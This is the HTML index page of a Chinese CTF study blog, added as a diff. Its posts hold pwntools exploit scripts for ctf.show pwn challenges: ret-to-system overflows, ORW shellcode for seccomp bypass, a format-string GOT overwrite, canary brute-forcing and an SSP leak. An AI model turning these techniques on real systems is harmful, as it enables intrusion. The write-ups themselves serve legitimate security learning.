@@ -1,0 +1,1478 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="linkpwn的学习经历">
+<meta property="og:type" content="website">
+<meta property="og:title" content="网络幻影">
+<meta property="og:url" content="http://linkpwn.github.io/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="linkpwn的学习经历">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://linkpwn.github.io/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+
+	<div class="tag-cloud">
+	  <div class="tag-cloud-tags" id="tags">
+		
+	  </div>
+	</div>
+	<br>
+	
+	<script type="text/javascript">
+     var alltags = document.getElementsByClassName('tag-cloud-tags');
+     var tags = alltags[0].getElementsByTagName('a');
+     for (var i = tags.length - 1; i >= 0; i--) {
+       var r=Math.floor(Math.random()*75+130);
+       var g=Math.floor(Math.random()*75+100);
+       var b=Math.floor(Math.random()*75+80);
+       tags[i].style.background = "rgb("+r+","+g+","+b+")";
+     }
+</script>
+
+<style>
+  .tag-cloud-tags{
+    /*font-family: Helvetica, Tahoma, Arial;*/
+    /*font-weight: 100;*/
+    text-align: center;
+    counter-reset: tags;
+  }
+  .tag-cloud-tags a{
+    border-radius: 6px;
+    padding-right: 5px;
+    padding-left: 5px;
+    margin: 8px 5px 0px 0px;
+  }
+  .tag-cloud-tags a:before{
+    content: "?";
+  }
+
+  .tag-cloud-tags a:hover{
+     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);
+     transform: scale(1.1);
+     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/
+     transition-duration: 0.15s;
+  }
+</style>
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/05/pwn125-scanf%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8system/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/05/pwn125-scanf%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8system/" class="post-title-link" itemprop="url">pwn125(scanf也可以调用system)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-05 16:19:24 / 修改时间：16:22:52" itemprop="dateCreated datePublished" datetime="2025-03-05T16:19:24+08:00">2025-03-05</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li><p>关键词眼：mov     rsi, rax；说明scanf也可以调用system</p>
+</li>
+<li><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn125&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn125&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,xxxxx)</span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x400672</span></span><br><span class="line"><span class="comment">#0x2000为偏移量</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + cyclic(<span class="number">0x2000</span>) + p64(call_system)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/02/sandbox%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/02/sandbox%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">sandbox绕过</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-02 10:30:44 / 修改时间：22:55:12" itemprop="dateCreated datePublished" datetime="2025-03-02T10:30:44+08:00">2025-03-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="sandbox-orw"><a href="#sandbox-orw" class="headerlink" title="sandbox_orw"></a>sandbox_orw</h1><ul>
+<li><p><a href="#shellcode%E7%BB%95%E8%BF%87">shellcode绕过</a></p>
+<ul>
+<li><p><a href="#x32">x32</a></p>
+</li>
+<li><p><a href="#x64">x64</a></p>
+</li>
+</ul>
+</li>
+</ul>
+<p>sandbox一般就是禁用了<code>execve</code>函数使我们没办法直接通过<code>system(/bin/sh\x00)</code>来getshell。如果会出现prctl,seccomp的话很可能就要用orw进行绕过。就是利用open，read，write(orw)。</p>
+<p>首先用seccomp-tools查看沙箱</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h3><p>汇编代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0x67616c66根据文件名改动</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>利用pwntools</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcraft.i386.<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">payload += shellcraft.i386.read(<span class="number">0x3</span>, save_to, <span class="number">0x100</span>)</span><br><span class="line">payload += shellcraft.i386.write(<span class="number">0x1</span>, save_to, <span class="number">0x100</span>)</span><br><span class="line">sh.sendline(asm(payload))</span><br></pre></td></tr></table></figure>
+
+<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>汇编代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor rsi,rsi;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rax,<span class="subst">&#123;convert_str_asmencode(<span class="string">&quot;././flag&quot;</span>)&#125;</span>;#根据文件名改动</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov rdi,rax;</span></span><br><span class="line"><span class="string">mov dl,0x40;</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov al,0;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov al,1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">pwn各类题型总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-02 08:42:10" itemprop="dateCreated datePublished" datetime="2025-03-02T08:42:10+08:00">2025-03-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-06 11:31:44" itemprop="dateModified" datetime="2025-03-06T11:31:44+08:00">2025-03-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ul>
+<li>栈溢出<ul>
+<li><a href="#ret2text">ret2text</a></li>
+<li><a href="#ret2shellcode">ret2shellcode</a></li>
+<li><a href="#ret2libc">ret2libc</a></li>
+<li><a href="#ret2syscall">ret2syscall</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串</a><ul>
+<li><a href="#%25n%EF%BF%BD9%EF%BF%BD%EF%BF%BD0@">%n篡改固定地址</a></li>
+<li><a href="#%25n%EF%BF%BD9printf_got%07%11system">%n篡改printf_got指向system</a></li>
+</ul>
+</li>
+<li><a href="#canary">canary</a><ul>
+<li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li>
+<li><a href="#SSP%E6%B3%84%E9%9C%B2Canary">SSP泄露Canary</a></li>
+<li><a href="#%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%E8%8E%B7%E5%8F%96Canary">覆盖截断字符获取Canary</a></li>
+<li><a href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8A%AB%E6%8C%81__stack_chk_fail%E6%8C%87%E9%92%88">格式化字符串劫持__stack_chk_fail指针</a></li>
+<li><a href="#canary,%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">canary,格式化字符串</a></li>
+<li><a href="#%E8%A6%86%E7%9B%96TCB%E6%9D%A5%E5%AE%9E%E7%8E%B0%E5%AF%B9canary%E7%9A%84%E7%BB%95%E8%BF%87">覆盖TCB来实现对canary的绕过</a></li>
+</ul>
+</li>
+<li><a href="#PIE%E7%BB%95%E8%BF%87">PIE绕过</a><ul>
+<li><a href="#%E7%88%86%E7%A0%B4pie">爆破pie</a></li>
+<li>[格式化字符串泄露pie和partial write](#格式化字符串泄露pie和partial write)</li>
+<li><a href="#%E5%88%A9%E7%94%A8vsyscall%E5%9C%B0%E5%9D%80%E4%B8%8D%E5%8F%98">利用vsyscall地址不变</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/24/pwn-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">文章</a></p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/28/pwn-%E9%83%A8%E5%88%86shellcode%E6%80%BB%E7%BB%93/">文章</a></p>
+<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/20/libc%E6%B3%84%E9%9C%B2/">文章</a></p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/03/02/ret2syscall/">文章</a>，完全是学长写的，我是勤劳的搬运工</p>
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="n篡改固定地址"><a href="#n篡改固定地址" class="headerlink" title="%n篡改固定地址"></a>%n篡改固定地址</h3><p>见我的另一篇<a href="http://linkpwn.github.io/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">文章</a></p>
+<h3 id="n篡改printf-got指向system"><a href="#n篡改printf-got指向system" class="headerlink" title="%n篡改printf_got指向system"></a>%n篡改printf_got指向system</h3><p>例题ctfshow pwn95</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &quot;amd64&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &quot;i386&quot;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#r = process(&quot;./pwn95&quot;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28204</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn95&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;    * *************************************                           &quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">6</span> <span class="comment">#偏移量根据具体情况来定</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload1 = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">printf_addr = u32(r.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment">#%p %p %p %p %p</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>这里有一个<a href="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/">模拟canary爆破</a></p>
+<p>模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;pwn.challenge.ctf.show&quot;,28257)</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn119&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn119&#x27;</span>)</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">backdoor = elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]</span><br><span class="line"></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xC</span>) + canary + p8(j)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    res = r.recv()</span><br><span class="line">    <span class="keyword">if</span> ( <span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;the <span class="subst">&#123;i&#125;</span> is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary += p8(j)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">assert</span>(<span class="built_in">len</span>(canary) == i+<span class="number">2</span>) </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Canary : <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二次溢出</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u32(canary)))</span><br><span class="line">payload = cyclic(<span class="number">0x70</span> - <span class="number">0xC</span>) + canary + cyclic(<span class="number">0xc</span>) + p32(backdoor)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSP泄露Canary"><a href="#SSP泄露Canary" class="headerlink" title="SSP泄露Canary"></a>SSP泄露Canary</h3><p>ctfshow pwn117<br>这里主要记录怎么算偏移即buf和__libc_argv[0]的偏移</p>
+<p>脚本除了偏移的计算其他都好理解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28116</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">offset = <span class="number">504</span></span><br><span class="line">payload = cyclic(offset) + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>计算过程先</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 100</span><br></pre></td></tr></table></figure>
+
+<p>再进行gdb调试先输入cyclic的结果，再通过如下两种方式计算<a target="_blank" rel="noopener" href="http://www.qfrost.com/posts/ctf/ssp_leak/">参考</a></p>
+<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/1.png" alt="1"></p>
+<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/2.png" alt="2"></p>
+<p><img src="/2025/03/02/pwn%E5%90%84%E7%B1%BB%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/3.png" alt="3"></p>
+<p>理论上应该是520才对，504可能是本题有点问题。</p>
